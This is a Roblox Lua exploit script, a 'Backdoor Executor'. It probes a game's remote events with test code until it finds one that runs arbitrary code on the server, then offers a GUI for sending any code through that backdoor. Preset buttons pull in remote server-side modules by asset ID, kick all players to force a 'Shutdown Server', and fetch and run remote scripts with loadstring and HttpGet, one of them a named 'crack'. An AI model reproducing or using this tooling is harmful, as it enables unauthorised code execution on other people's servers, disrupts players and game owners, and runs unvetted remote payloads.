--[[

===============================================================================

This script was made by Kaguei. If you modify it, please give me credit.

===============================================================================

]]

local function coreNotify(title, text)
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = title,
            Text = text,
            Duration = 5
        })
end

coreNotify("Backdoor Executor", "Scanning for backdoors...")

local lugares = {
    game:GetService("Workspace"),
    game:GetService("Lighting"),
    game:GetService("ReplicatedStorage"),
    game:GetService("StarterGui"),
    game:GetService("StarterPlayer"),
    game:GetService("StarterPack"),
    game:GetService("Players"),
    game:GetService("Teams"),
    game:GetService("Chat"),
    game:GetService("SoundService"),
    game:GetService("CoreGui")
}

local function randomName(len)
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local s = ""
    for i = 1, len do
        local r = math.random(1, #chars)
        s ..= chars:sub(r, r)
    end
    return s
end

local function buildTestCode(modelName)
    return ([[local m = Instance.new("Model")
m.Name = "%s"
m.Parent = workspace]]):format(modelName)
end

local function testRemote(remote)
    for i = 1, 100 do
        local name = "BD_CHECK_" .. randomName(6)
        local code = buildTestCode(name)

        pcall(function()
            if remote:IsA("RemoteEvent") then
                remote:FireServer(code)
            else
                remote:InvokeServer(code)
            end
        end)

      local found = false

for _ = 1, 20 do
    local obj = workspace:FindFirstChild(name)
    if obj then
        obj:Destroy()
        found = true
        break
    end
    task.wait(0.1)
end

if found then
    return true
end
    end
    return false
end

local function findValidRemoteEarly()
    for _, base in ipairs(lugares) do
        for _, obj in ipairs(base:GetDescendants()) do
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                if testRemote(obj) then
                    return obj
                end
            end
        end
    end
    return nil
end

local validRemote
local finished = false

task.spawn(function()
    validRemote = findValidRemoteEarly()
    finished = true
end)

local start = tick()
while not finished and tick() - start < 6 do
    task.wait(0.1)
end

if not validRemote then
    coreNotify("Backdoor Executor", "Game not backdoored")
    return
end

getgenv().validRemote = validRemote

coreNotify("Backdoor Executor", "Backdoor found!")

local Players = game:GetService("Players")



local StarterGui = game:GetService("StarterGui")



local TweenService = game:GetService("TweenService")



local LocalPlayer = Players.LocalPlayer



local player = Players.LocalPlayer



local displayName = Players.LocalPlayer.DisplayName



local selectedColor = Color3.fromRGB(60, 60, 60)



local unselectedColor = Color3.fromRGB(30, 30, 30)



local tabButtons = {}



local function FireButtonClickSound()

    local sound = Instance.new("Sound")



    sound.SoundId = "rbxassetid://6042053626"



    sound.Volume = 1



    sound.Name = "ButtonClickSound"



    sound.Parent = workspace



    sound:Play()

end



local ScreenGui = Instance.new("ScreenGui", game.CoreGui)



ScreenGui.Name = "BackdoorExecutor"



ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling



local MainFrame = Instance.new("Frame", ScreenGui)



MainFrame.Size = UDim2.new(0, 550, 0, 300)



MainFrame.Position = UDim2.new(0.5, 0, 0.5, -175)



MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)



MainFrame.BorderSizePixel = 0



MainFrame.AnchorPoint = Vector2.new(0.5, 0)



MainFrame.Active = true



MainFrame.Draggable = true



Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)



local FloatButton = Instance.new("ImageButton", ScreenGui)



FloatButton.Name = "FloatToggleButton"



FloatButton.Size = UDim2.new(0, 50, 0, 50)



FloatButton.Position = UDim2.new(1, -60, 0, 50)



FloatButton.AnchorPoint = Vector2.new(1, 0)



FloatButton.BackgroundColor3 = Color3.fromRGB(15, 15, 15)



FloatButton.BackgroundTransparency = 0.3



FloatButton.BorderSizePixel = 0



FloatButton.AutoButtonColor = true



FloatButton.Image = "rbxassetid://73002885569080"



FloatButton.Active = true



FloatButton.Draggable = true



Instance.new("UICorner", FloatButton).CornerRadius = UDim.new(0, 8)



local menuVisible = true



FloatButton.MouseButton1Click:Connect(

    function()

        menuVisible = not menuVisible



        MainFrame.Visible = menuVisible



        FireButtonClickSound()

    end

)



local TabBar = Instance.new("Frame", MainFrame)



TabBar.Size = UDim2.new(0, 50, 1, 0)



TabBar.Position = UDim2.new(0, 0, 0, 0)



TabBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)



Instance.new("UICorner", TabBar).CornerRadius = UDim.new(0, 10)



local Divider = Instance.new("Frame", MainFrame)



Divider.Size = UDim2.new(0, 1, 1, 0)



Divider.Position = UDim2.new(0, 50, 0, 0)



Divider.BackgroundColor3 = Color3.fromRGB(60, 60, 60)



Divider.BorderSizePixel = 0



local DividerAboveClearLogs = Instance.new("Frame", MainFrame)



DividerAboveClearLogs.Size = UDim2.new(1, -51, 0, 1)



DividerAboveClearLogs.Position = UDim2.new(0, 51, 1, -45)



DividerAboveClearLogs.AnchorPoint = Vector2.new(0, 1)



DividerAboveClearLogs.BackgroundColor3 = Color3.fromRGB(60, 60, 60)



DividerAboveClearLogs.BorderSizePixel = 0



DividerAboveClearLogs.Visible = false



local TweenService = game:GetService("TweenService")



local ContentFrame = Instance.new("Frame", MainFrame)



ContentFrame.Size = UDim2.new(1, -51, 1, 0)



ContentFrame.Position = UDim2.new(0, 51, 0, 0)



ContentFrame.BackgroundTransparency = 1



local Title = Instance.new("TextLabel", ContentFrame)



Title.Size = UDim2.new(1, -90, 0, 40)



Title.Position = UDim2.new(0, 10, 0, 0)



Title.BackgroundTransparency = 1



Title.Text = " Backdoor Executor"



Title.Font = Enum.Font.GothamBold



Title.TextSize = 24



Title.TextColor3 = Color3.fromRGB(255, 255, 255)



Title.TextXAlignment = Enum.TextXAlignment.Left



local originalTitlePos = Title.Position



local CloseButton = Instance.new("TextButton", ContentFrame)



CloseButton.Size = UDim2.new(0, 30, 0, 30)



CloseButton.Position = UDim2.new(1, -35, 0, 5)



CloseButton.BackgroundTransparency = 1



CloseButton.Text = "X"



CloseButton.Font = Enum.Font.GothamBold



CloseButton.TextSize = 20



CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)



CloseButton.MouseButton1Click:Connect(

    function()

        FireButtonClickSound()



        ScreenGui:Destroy()



        if _G.ActiveNotifications then

            for _, notif in ipairs(_G.ActiveNotifications) do

                if notif and notif.Parent then

                    notif:Destroy()

                end

            end



            table.clear(_G.ActiveNotifications)

        end



        if _G.NotificationGui and _G.NotificationGui.Parent then

            _G.NotificationGui:Destroy()



            _G.NotificationGui = nil

        end

    end

)



local MinimizeButton = Instance.new("TextButton", ContentFrame)



MinimizeButton.Size = UDim2.new(0, 30, 0, 30)



MinimizeButton.Position = UDim2.new(1, -70, 0, 5)



MinimizeButton.BackgroundTransparency = 1



MinimizeButton.Text = "—"



MinimizeButton.Font = Enum.Font.GothamBold



MinimizeButton.TextSize = 24



MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)



local originalSize = MainFrame.Size



local minimized = false



local originalVisibility = {}



local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)



local minimizedSize = UDim2.new(originalSize.X.Scale, originalSize.X.Offset, 0, 40)



local minimizedTitlePos = UDim2.new(0, -ContentFrame.Position.X.Offset + 5, 0, 0)



MinimizeButton.MouseButton1Click:Connect(

    function()

        minimized = not minimized



        if minimized then

            for _, obj in pairs(ContentFrame:GetChildren()) do

                if obj:IsA("GuiObject") and obj ~= Title and obj ~= MinimizeButton and obj ~= CloseButton then

                    originalVisibility[obj] = obj.Visible



                    obj.Visible = false

                end

            end



            originalVisibility[TabBar] = TabBar.Visible



            originalVisibility[Divider] = Divider.Visible



            TabBar.Visible = false



            Divider.Visible = false



            DividerAboveClearLogs.Visible = false



            TweenService:Create(MainFrame, tweenInfo, {Size = minimizedSize}):Play()



            TweenService:Create(Title, tweenInfo, {Position = minimizedTitlePos}):Play()



            MinimizeButton.Text = "+"



            FireButtonClickSound()

        else

            for obj, wasVisible in pairs(originalVisibility) do

                if obj and obj.Parent then

                    obj.Visible = wasVisible

                end

            end



            TweenService:Create(MainFrame, tweenInfo, {Size = originalSize}):Play()



            TweenService:Create(Title, tweenInfo, {Position = originalTitlePos}):Play()



            MinimizeButton.Text = "â€”"



            FireButtonClickSound()

        end

    end

)



local TextBox = Instance.new("TextBox", ContentFrame)



TextBox.Position = UDim2.new(0.05, 0, 0.2, 0)



TextBox.Size = UDim2.new(0.9, 0, 0.5, 0)



TextBox.PlaceholderText = "Input code here"



TextBox.Text = ""



TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)



TextBox.BackgroundColor3 = Color3.fromRGB(35, 35, 35)



TextBox.ClearTextOnFocus = false



TextBox.TextWrapped = true



TextBox.TextXAlignment = Enum.TextXAlignment.Left



TextBox.TextYAlignment = Enum.TextYAlignment.Top



TextBox.Font = Enum.Font.Code



TextBox.TextSize = 16



TextBox.MultiLine = true



Instance.new("UICorner", TextBox).CornerRadius = UDim.new(0, 8)



local function createButton(text, position)

    local button = Instance.new("TextButton", ContentFrame)



    button.Size = UDim2.new(0.4, 0, 0, 35)



    button.Position = position



    button.Text = text



    button.Font = Enum.Font.GothamMedium



    button.TextSize = 16



    button.TextColor3 = Color3.fromRGB(255, 255, 255)



    button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)



    Instance.new("UICorner", button).CornerRadius = UDim.new(0, 8)



    return button

end



local ExecuteButton = createButton(" Execute", UDim2.new(0.05, 0, 0.78, 0))



local ClearButton = createButton(" Clear", UDim2.new(0.55, 0, 0.78, 0))



local ConsolePanel = Instance.new("ScrollingFrame", ContentFrame)



ConsolePanel.Size = UDim2.new(1, -20, 0.6, 0)



ConsolePanel.Position = UDim2.new(0, 10, 0.25, 0)



ConsolePanel.Visible = false



ConsolePanel.BackgroundTransparency = 1



ConsolePanel.ScrollBarThickness = 4



ConsolePanel.CanvasSize = UDim2.new(0, 0, 0, 0)



ConsolePanel.AutomaticCanvasSize = Enum.AutomaticSize.Y



local ConsoleLayout = Instance.new("UIListLayout", ConsolePanel)



ConsoleLayout.SortOrder = Enum.SortOrder.LayoutOrder



ConsoleLayout.Padding = UDim.new(0, 2)



local function getTimestamp()

    local now = os.date("*t")



    return string.format("[%02d:%02d:%02d]", now.hour, now.min, now.sec)

end



local function logToConsole(prefix, text, color)

    local label = Instance.new("TextLabel", ConsolePanel)



    label.Text = string.format("%s [%s] %s", getTimestamp(), prefix, text)



    label.TextColor3 = color or Color3.fromRGB(255, 255, 255)



    label.Font = Enum.Font.Code



    label.TextSize = 16



    label.TextXAlignment = Enum.TextXAlignment.Left



    label.BackgroundTransparency = 1



    label.Size = UDim2.new(1, -10, 0, 20)

end



local buttonCache = {}



local function animateClick(button)

    if not buttonCache[button] then

        buttonCache[button] = {

            Position = button.Position,

            Size = button.Size

        }

    end



    local original = buttonCache[button]



    local pressTween =

        TweenService:Create(

        button,

        TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),

        {

            Position = original.Position + UDim2.new(0, 0, 0, 2),

            Size = original.Size - UDim2.new(0, 0, 0, 2)

        }

    )



    local releaseTween =

        TweenService:Create(

        button,

        TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.In),

        {

            Position = original.Position,

            Size = original.Size

        }

    )



    pressTween:Play()



    pressTween.Completed:Connect(

        function()

            releaseTween:Play()

        end

    )

end



local ClearLogsButton = Instance.new("TextButton", ContentFrame)



ClearLogsButton.Size = UDim2.new(0, 100, 0, 30)



ClearLogsButton.Position = UDim2.new(0, 5, 1, -10)



ClearLogsButton.AnchorPoint = Vector2.new(0, 1)



ClearLogsButton.Text = "Clear Logs"



ClearLogsButton.Font = Enum.Font.GothamMedium



ClearLogsButton.TextSize = 14



ClearLogsButton.TextColor3 = Color3.fromRGB(255, 255, 255)



ClearLogsButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45)



ClearLogsButton.Visible = false



Instance.new("UICorner", ClearLogsButton).CornerRadius = UDim.new(0, 6)



ClearLogsButton.MouseButton1Click:Connect(

    function()

        animateClick(ClearLogsButton)



        FireButtonClickSound()



        coreNotify("Success", "Successfully Cleared")



        for _, obj in pairs(ConsolePanel:GetChildren()) do

            if obj:IsA("TextLabel") then

                obj:Destroy()

            end

        end

    end

)

getgenv().remotesCache = getgenv().remotesCache or nil

ExecuteButton.MouseButton1Click:Connect(function()
    FireButtonClickSound()
    animateClick(ExecuteButton)

    local code = TextBox.Text
    if not code or code:match("^%s*$") then
        coreNotify("Error", "No code provided")
        logToConsole("ERROR", "No code provided", Color3.fromRGB(255, 100, 100))
        return
    end

    local r = getgenv().validRemote
    if not r then
        return
    end

    local ok, err = pcall(function()
        if r:IsA("RemoteEvent") then
            r:FireServer(code)
        else
            r:InvokeServer(code)
        end
    end)

    if ok then
        coreNotify("Success", "Script Executed")
        logToConsole("SUCCESS", "Script Executed", Color3.fromRGB(100, 255, 100))
    else
    end
end)



ClearButton.MouseButton1Click:Connect(

    function()

        FireButtonClickSound()



        animateClick(ClearButton)



        TextBox.Text = ""



        coreNotify("Success", "Successfully Cleared")



        logToConsole("INFO", "Textbox Cleared", Color3.fromRGB(255, 255, 255))

    end

)



local ScriptPanel = Instance.new("ScrollingFrame", ContentFrame)



ScriptPanel.Size = UDim2.new(1, -20, 0.7, 0)



ScriptPanel.Position = UDim2.new(0, 10, 0.2, 0)



ScriptPanel.Name = "ScriptPanel"



ScriptPanel.Visible = false



ScriptPanel.BackgroundTransparency = 1



ScriptPanel.ScrollBarThickness = 4



ScriptPanel.CanvasSize = UDim2.new(0, 0, 0, 0)



ScriptPanel.AutomaticCanvasSize = Enum.AutomaticSize.Y



ScriptPanel.ClipsDescendants = true



local ScriptLayout = Instance.new("UIListLayout", ScriptPanel)



ScriptLayout.SortOrder = Enum.SortOrder.LayoutOrder



ScriptLayout.Padding = UDim.new(0, 5)



local ParagraphPanel = Instance.new("ScrollingFrame", ContentFrame)



ParagraphPanel.Size = UDim2.new(1, -20, 0.7, 0)



ParagraphPanel.Position = UDim2.new(0, 10, 0.2, 0)



ParagraphPanel.Name = "ParagraphPanel"



ParagraphPanel.Visible = false



ParagraphPanel.BackgroundTransparency = 1



ParagraphPanel.ScrollBarThickness = 4



ParagraphPanel.CanvasSize = UDim2.new(0, 0, 0, 0)



ParagraphPanel.AutomaticCanvasSize = Enum.AutomaticSize.Y



local ParagraphLayout = Instance.new("UIListLayout", ParagraphPanel)



ParagraphLayout.SortOrder = Enum.SortOrder.LayoutOrder



ParagraphLayout.Padding = UDim.new(0, 10)



local function SetActiveTab(tab)

    TextBox.Visible = false



    ExecuteButton.Visible = false



    ClearButton.Visible = false



    ScriptPanel.Visible = false



    ConsolePanel.Visible = false



    ParagraphPanel.Visible = false



    for name, button in pairs(tabButtons) do

        if button then

            button.BackgroundColor3 = (name == tab) and selectedColor or unselectedColor

        end

    end



    if tab == "executor" then

        TextBox.Visible = true



        ExecuteButton.Visible = true



        ClearButton.Visible = true

    elseif tab == "scripts" then

        ScriptPanel.Visible = true

    elseif tab == "console" then

        ConsolePanel.Visible = true



        ClearLogsButton.Visible = true

    elseif tab == "paragraphs" then

        ParagraphPanel.Visible = true

    end



    ClearLogsButton.Visible = (tab == "console")



    DividerAboveClearLogs.Visible = (tab == "console")



    FireButtonClickSound()

end



local TweenService = game:GetService("TweenService")



local buttonCache = {}



local function animateClick(button)

    if not buttonCache[button] then

        buttonCache[button] = {

            Position = button.Position,

            Size = button.Size

        }

    end



    local original = buttonCache[button]



    local pressTween =

        TweenService:Create(

        button,

        TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),

        {

            Position = original.Position + UDim2.new(0, 0, 0, 2),

            Size = original.Size - UDim2.new(0, 0, 0, 2)

        }

    )



    local releaseTween =

        TweenService:Create(

        button,

        TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.In),

        {

            Position = original.Position,

            Size = original.Size

        }

    )



    pressTween:Play()



    pressTween.Completed:Connect(

        function()

            releaseTween:Play()

        end

    )

end



_G.AddSection = function(text)

    local label = Instance.new("TextLabel", ScriptPanel)



    label.Size = UDim2.new(1, 0, 0, 25)



    label.Text = text



    label.Font = Enum.Font.GothamBold



    label.TextSize = 18



    label.TextColor3 = Color3.fromRGB(255, 255, 255)



    label.BackgroundTransparency = 1

end



_G.AddButton = function(text, code)

    local button = Instance.new("TextButton", ScriptPanel)



    button.Size = UDim2.new(1, 0, 0, 30)



    button.Text = text



    button.Font = Enum.Font.Gotham



    button.TextSize = 16



    button.TextColor3 = Color3.fromRGB(255, 255, 255)



    button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)



    Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)



    button.MouseButton1Click:Connect(

        function()

            SetActiveTab("executor")



            TextBox.Text = code

        end

    )

end



_G.LocalScriptButton = function(text, func)

    local button = Instance.new("TextButton", ScriptPanel)



    button.Size = UDim2.new(1, 0, 0, 30)



    button.Text = text



    button.Font = Enum.Font.Gotham



    button.TextSize = 16



    button.TextColor3 = Color3.fromRGB(255, 255, 255)



    button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)



    Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)



    button.MouseButton1Click:Connect(

        function()

            logToConsole("SUCCESS", "Script Executed", Color3.fromRGB(100, 255, 100))



            coreNotify("Success", "Successfully executed")



            FireButtonClickSound()



            animateClick(button)



            func()

        end

    )

end



local function createTabButton(order, tabName, callback, imageId)

    local tab = Instance.new("ImageButton", TabBar)



    tab.Size = UDim2.new(1, 0, 0, 50)



    tab.Position = UDim2.new(0, 0, 0, order * 50)



    tab.Image = "rbxassetid://" .. imageId



    tab.BackgroundColor3 = unselectedColor



    tab.AutoButtonColor = false



    tab.Name = tabName



    local corner = Instance.new("UICorner", tab)



    corner.CornerRadius = UDim.new(0, 8)



    tab.MouseButton1Click:Connect(

        function()

            SetActiveTab(tabName)



            callback()

        end

    )



    tabButtons[tabName] = tab

end



_G.AddParagraph = function(title, description)

    local container = Instance.new("Frame", ParagraphPanel)



    container.Size = UDim2.new(1, 0, 0, 0)



    container.AutomaticSize = Enum.AutomaticSize.Y



    container.BackgroundColor3 = Color3.fromRGB(35, 35, 35)



    container.BorderSizePixel = 0



    container.LayoutOrder = #ParagraphPanel:GetChildren()



    Instance.new("UICorner", container).CornerRadius = UDim.new(0, 6)



    local padding = Instance.new("UIPadding", container)



    padding.PaddingBottom = UDim.new(0, 10)



    padding.PaddingLeft = UDim.new(0, 10)



    padding.PaddingRight = UDim.new(0, 10)



    padding.PaddingTop = UDim.new(0, 5)



    local titleLabel = Instance.new("TextLabel", container)



    titleLabel.Size = UDim2.new(1, 0, 0, 22)



    titleLabel.Text = title



    titleLabel.Font = Enum.Font.GothamBold



    titleLabel.TextSize = 20



    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)



    titleLabel.BackgroundTransparency = 1



    titleLabel.TextXAlignment = Enum.TextXAlignment.Left



    local descLabel = Instance.new("TextLabel", container)



    descLabel.Size = UDim2.new(1, 0, 0, 0)



    descLabel.AutomaticSize = Enum.AutomaticSize.Y



    descLabel.Text = description



    descLabel.Font = Enum.Font.SourceSans



    descLabel.TextSize = 18



    descLabel.TextColor3 = Color3.fromRGB(255, 255, 255)



    descLabel.BackgroundTransparency = 1



    descLabel.TextWrapped = true



    descLabel.TextXAlignment = Enum.TextXAlignment.Left



    descLabel.Position = UDim2.new(0, 0, 0, 28)

end



createTabButton(

    0,

    "executor",

    function()

    end,

    100887013142034

)



createTabButton(

    1,

    "scripts",

    function()

    end,

    91156715735899

)



createTabButton(

    2,

    "console",

    function()

    end,

    72275937634892

)



createTabButton(

    3,

    "paragraphs",

    function()

    end,

    92524141452897

)



SetActiveTab("executor")



_G.AddSection("Server Side Scripts")



_G.AddButton(

    "Sensation Hub",

    'require(100263845596551)("' ..

        LocalPlayer.Name ..

            '", ColorSequence.new(Color3.fromRGB(71, 148, 253), Color3.fromRGB(71, 253, 160)), "Standard")'

)

_G.AddButton(
    "Happy Hub SS",
    'require(135231466738957):Hload("' .. LocalPlayer.Name .. '")'
)

_G.AddButton("R6 Convert", 'require(3436957371):r6("' .. LocalPlayer.Name .. '")')



_G.AddButton("Respawn Character", 'game.Players["' .. LocalPlayer.Name .. '"]:LoadCharacter()')



_G.AddButton(

"Dummy Spawn", 

[[

-- ============================

-- Dummy - Made by Conta Teste

-- ============================



-- Dummy Configurations:

local h = 100 -- Max Health | Example: 100

local i = 100 -- Current Health | Example: 50



-- Dummy Code:

local Players = game:GetService("Players")

local player = Players:GetPlayers()[1]

function a(g)

local dummy = Instance.new("Model")

dummy.Name = "Dummy"

function d(c, e, f)

local p = Instance.new("Part")

p.Name = c

p.Size = e

p.BrickColor = BrickColor.new(f)

p.Anchored = false

p.CanCollide = true

p.TopSurface = Enum.SurfaceType.Smooth

p.BottomSurface = Enum.SurfaceType.Smooth

p.Parent = dummy

return p

end

local Head = d("Head", Vector3.new(2, 1, 1), "Medium stone grey")

local Torso = d("Torso", Vector3.new(2, 2, 1), "Medium stone grey")

local LeftArm = d("Left Arm", Vector3.new(1, 2, 1), "Medium stone grey")

local RightArm = d("Right Arm", Vector3.new(1, 2, 1), "Medium stone grey")

local LeftLeg = d("Left Leg", Vector3.new(1, 2, 1), "Medium stone grey")

local RightLeg = d("Right Leg", Vector3.new(1, 2, 1), "Medium stone grey")

local headMesh = Instance.new("SpecialMesh")

headMesh.MeshType = Enum.MeshType.Head

headMesh.Scale = Vector3.new(1.25, 1.25, 1.25)

headMesh.Parent = Head

local face = Instance.new("Decal")

face.Texture = "rbxasset://textures/face.png"

face.Face = Enum.NormalId.Front

face.Parent = Head

Torso.Position = g

Head.Position = g + Vector3.new(0, 1.5, 0)

LeftArm.Position = g + Vector3.new(-1.5, 0.5, 0)

RightArm.Position = g + Vector3.new(1.5, 0.5, 0)

LeftLeg.Position = g + Vector3.new(-0.5, -1.5, 0)

RightLeg.Position = g + Vector3.new(0.5, -1.5, 0)

local humanoid = Instance.new("Humanoid")

humanoid.Name = "Humanoid"

humanoid.RigType = Enum.HumanoidRigType.R6

humanoid.MaxHealth = h

humanoid.Health = i

humanoid.Parent = dummy

function b(c, part0, part1, c0, c1)

local motor = Instance.new("Motor6D")

motor.Name = c

motor.Part0 = part0

motor.Part1 = part1

motor.C0 = c0

motor.C1 = c1

motor.Parent = part0

end

b("Neck", Torso, Head, CFrame.new(0, 1, 0), CFrame.new(0, -0.5, 0))

b("Left Shoulder", Torso, LeftArm, CFrame.new(-1, 0.5, 0), CFrame.new(0.5, 0.5, 0))

b("Right Shoulder", Torso, RightArm, CFrame.new(1, 0.5, 0), CFrame.new(-0.5, 0.5, 0))

b("Left Hip", Torso, LeftLeg, CFrame.new(-0.5, -1, 0), CFrame.new(0, 1, 0))

b("Right Hip", Torso, RightLeg, CFrame.new(0.5, -1, 0), CFrame.new(0, 1, 0))

dummy.PrimaryPart = Torso

dummy.Parent = workspace

end

if not player then return end

local char = player.Character

if not char then return end

local hrp = char:FindFirstChild("HumanoidRootPart")

if not hrp then return end

local pos = hrp.Position + Vector3.new(3, 0, 0)

a(pos)

]]

)



_G.AddButton("Grab Knife V4 (R6 Only)", 'require(18665717275).load("' .. LocalPlayer.Name .. '")')



_G.AddButton("Rainbow Stand (R6 Only)", 'require(5098731275).eliza("' .. LocalPlayer.Name .. '")')



_G.AddButton("C4 Bomb", 'require(0x1767bf813)("' .. LocalPlayer.Name .. '")')



_G.AddButton(

    "Shutdown Server",

    [[



for _, v in pairs(game.Players:GetPlayers()) do



v:Kick("Server has Shutdown")



end



]]

)



_G.AddButton("Grab Knife V4 (R6 Only)", 'require(18665717275).load("' .. LocalPlayer.Name .. '")')



_G.AddButton("Rainbow Stand (R6 Only)", 'require(5098731275).eliza("' .. LocalPlayer.Name .. '")')



_G.AddButton("C4 Bomb", 'require(0x1767bf813)("' .. LocalPlayer.Name .. '")')



_G.AddButton(

    "Shutdown Server",

    [[



for _, v in pairs(game.Players:GetPlayers()) do



v:Kick("Server has Shutdown")



end



]]

)



_G.AddButton("Hint", [[



Instance.new("Hint", workspace).Text = "Text Here"



]])



_G.AddSection("Client Side Scripts")



_G.LocalScriptButton(

    "Infinite Yield",

    function()

        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()

    end

)



_G.LocalScriptButton(

    "Fly GUI V3",

    function()

        loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()

    end

)



_G.LocalScriptButton(

    "Keyboard",

    function()

        loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt", true))()

    end

)

_G.AddParagraph("Credits", "Script created by Conta Teste (Scripted and Design) ")
_G.AddParagraph("Update Log", "+ Bug Fixes")

logToConsole("WELCOME", "Welcome to Console!", Color3.fromRGB(0, 255, 255))

coreNotify("Welcome", "Hello " .. displayName .. ". Welcome to Backdoor Executor!")

for _, obj in ipairs(ScreenGui:GetDescendants()) do
    if obj:IsA("ScrollingFrame") then
        obj.ScrollBarThickness = 0
    end
end